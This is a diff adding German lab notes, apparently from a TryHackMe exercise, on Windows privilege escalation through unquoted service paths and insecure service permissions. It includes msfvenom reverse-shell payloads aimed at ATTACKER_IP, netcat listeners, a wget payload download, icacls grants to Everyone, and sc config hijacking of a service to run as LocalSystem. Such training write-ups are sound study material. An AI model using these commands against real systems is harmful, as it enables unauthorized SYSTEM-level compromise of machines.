@@ -208,3 +208,97 @@ Wenn wir nicht wie bisher direkt in die ausführbaren Dateien eines Dienstes sch
 Bei der Arbeit mit Windows-Diensten tritt ein ganz besonderes Verhalten auf, wenn der Dienst so konfiguriert ist, dass er auf eine „unquotierte“ ausführbare Datei verweist. Mit „unquotiert“ ist gemeint, dass der Pfad der zugehörigen ausführbaren Datei nicht richtig in Anführungszeichen gesetzt ist, um Leerzeichen im Befehl zu berücksichtigen.
 Schauen wir uns als Beispiel den Unterschied zwischen zwei Diensten an (diese Dienste dienen nur als Beispiel und sind auf Ihrem Rechner möglicherweise nicht verfügbar). Der erste Dienst verwendet ein korrektes Anführungszeichen, so dass der SCM zweifelsfrei weiß, dass er die Binärdatei mit dem Namen „C:\Programme\RealVNC\VNC Server\vncserver.exe“, gefolgt von den angegebenen Parametern, ausführen muss:
 
+https://i.imgur.com/LF2B6Yr.png
+
+Der zweite in dem Besipiel oberhalb erfüllt keine richtige "quotation".
+
+Wenn der SCM versucht, die zugehörige Binärdatei auszuführen, tritt ein Problem auf. Da der Name des Ordners "Disk Sorter Enterprise" Leerzeichen enthält, wird der Befehl mehrdeutig, und der SCM weiß nicht, welche der folgenden Befehle Sie auszuführen versuchen:
+
+|Command|Argument 1|Argument 2|
+|---|---|---|
+|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
+|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe||
+|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe|||
+Dies hat damit zu tun, wie die Eingabeaufforderung einen Befehl analysiert. Wenn Sie einen Befehl senden, werden normalerweise Leerzeichen als Argumenttrennzeichen verwendet, es sei denn, sie sind Teil einer in Anführungszeichen gesetzten Zeichenfolge. Das bedeutet, dass die „richtige“ Interpretation des nicht in Anführungszeichen gesetzten Befehls darin bestünde, C:\\MeineProgramme\\Disk.exe auszuführen und den Rest als Argumente zu übernehmen.
+
+Anstatt zu scheitern, wie es wahrscheinlich der Fall sein sollte, versucht der SCM, dem Benutzer zu helfen und beginnt mit der Suche nach den einzelnen Binärdateien in der in der Tabelle angegebenen Reihenfolge:
+1. Zuerst wird nach C:\\MyPrograms\\Disk.exe gesucht. Wenn sie existiert, führt der Dienst diese ausführbare Datei aus.
+2. Wenn letztere nicht vorhanden ist, sucht er anschließend nach C:\\MyPrograms\\Disk Sorter.exe. Wenn diese vorhanden ist, führt der Dienst diese ausführbare Datei aus.
+3. Wenn letztere nicht existiert, sucht er nach C:\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. Es wird erwartet, dass diese Option erfolgreich ist, und sie wird normalerweise bei einer Standardinstallation ausgeführt.
+
+Anhand dieses Verhaltens wird das Problem deutlich. Wenn ein Angreifer eine der ausführbaren Dateien erstellt, nach denen vor der erwarteten ausführbaren Datei des Dienstes gesucht wird, kann er den Dienst zwingen, eine beliebige ausführbare Datei auszuführen.
+Das hört sich zwar trivial an, aber die meisten ausführbaren Dateien der Dienste werden standardmäßig unter C:\Programme oder C:\Programme (x86) installiert, die für unberechtigte Benutzer nicht beschreibbar sind. Dadurch wird verhindert, dass ein anfälliger Dienst ausgenutzt werden kann. Es gibt Ausnahmen von dieser Regel: - Einige Installationsprogramme ändern die Berechtigungen für die installierten Ordner, wodurch die Dienste angreifbar werden. - Ein Administrator könnte beschließen, die Dienst-Binärdateien in einem nicht standardmäßigen Pfad zu installieren. Wenn ein solcher Pfad weltweit beschreibbar ist, kann die Sicherheitslücke ausgenutzt werden.
+
+In unserem Fall Beispiel installierte der Administrator die Disk Sorter-Binärdateien unter c:\MyPrograms. Standardmäßig erbt dieses Verzeichnis die Berechtigungen des Verzeichnisses C:\, so dass jeder Benutzer darin Dateien und Ordner erstellen kann. Wir können dies mit icacls überprüfen:
+```
+icals c:\MyPrograms
+```
+https://i.imgur.com/EcvTtsf.png
+
+Die Gruppe BUILTIN\\Users hat AD- und WD-Rechte, so dass der Benutzer Unterverzeichnisse bzw. Dateien erstellen kann.
+Der Prozess der Erstellung eines Exe-Dienst-Payloads mit msfvenom und dessen Übertragung auf den Zielhost ist derselbe wie zuvor, daher können wir folgende Payload erstellen und sie wie zuvor auf den Server hochladen. Wir werden auch einen Listener starten, um die Reverse Shell zu empfangen, wenn sie ausgeführt wird:
+
+```
+user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe 
+# Erstellen der Payload
+
+#Starten des Listeners
+user@attackerpc$ nc -lvp 4446
+```
+  
+Sobald sich die Payload auf dem Server befindet, verschiebt man sie an einen der Orte, an denen ein Hijacking stattfinden könnte. In diesem Fall verschieben wir unseren Payload nach C:\MyPrograms\Disk.exe. Wir gewähren außerdem allen Benutzern volle Rechte für die Datei, um sicherzustellen, dass sie vom Dienst ausgeführt werden kann:
+```
+#Verschieben und Umbenennen
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+
+# allen rechte auf die Datei geben
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+
+#Stoppen und Starten des Dienstes am besten via CMD
+sc stop "disk sorter enterprise" 
+sc start "disk sorter enterprise"
+```
+
+
+### Insecure Service Permissions
+Unter Umständen haben Sie noch eine kleine Chance, einen Dienst zu nutzen, wenn die ausführbare DACL (Discretionary Access Control Lists) des Dienstes gut konfiguriert ist und der Binärpfad des Dienstes richtig angegeben ist. Sollte die DACL des Dienstes (nicht die ausführbare DACL des Dienstes) es Ihnen erlauben, die Konfiguration eines Dienstes zu ändern, können Sie den Dienst neu konfigurieren. Dadurch können Sie auf jede beliebige ausführbare Datei verweisen und sie mit jedem beliebigen Konto ausführen, einschließlich SYSTEM selbst.
+
+Um von der Befehlszeile aus nach einer Dienst-DACL zu suchen, können Sie Accesschk aus der Sysinternals-Suite verwenden. Eine Kopie davon finden Sie unter C:\\tools. Der Befehl zur Überprüfung der DACL für den Dienst thmservice lautet:
+```
+accesschk64.exe -qlc thmservice
+```
+Hier können wir sehen, dass die Gruppe BUILTIN\\Users die Berechtigung SERVICE_ALL_ACCESS hat, was bedeutet, dass jeder Benutzer den Dienst neu konfigurieren kann.
+https://imgur.com/KBCAl9k
+  
+
+Bevor wir den Dienst ändern, erstellen wir eine weitere exe-service reverse shell und starten einen Listener dafür auf dem Rechner des Angreifers:
+```
+Payload Anlegen
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+
+
+Listener Starten
+nc -lvp 4447
+```
+
+Wie Gewohnt übertragen wir diese via wget in dem besipeil machen wir das in dem `C:\Users\thm-unpriv` Verzeichniss mit:
+```
+ wget http://10.10.46.52:8000/rev-svc3.exe -O rev-svc3.exe
+```
+
+Da Der file Name und ort nicht mehr angepasst werden müssen können wir direkt die Rechte anpassen 
+```
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+```
+  
+Um die dem Dienst zugeordnete ausführbare Datei und das Konto zu ändern, können wir den folgenden Befehl verwenden (beachten Sie die Leerzeichen nach den Gleichheitszeichen, wenn Sie sc.exe verwenden):
+```
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
+
+Und im anschluss wird der Dienst nochmal gestoppt und wieder neu gestartet
+```
+sc stop THMService 
+sc start THMService
+```
+
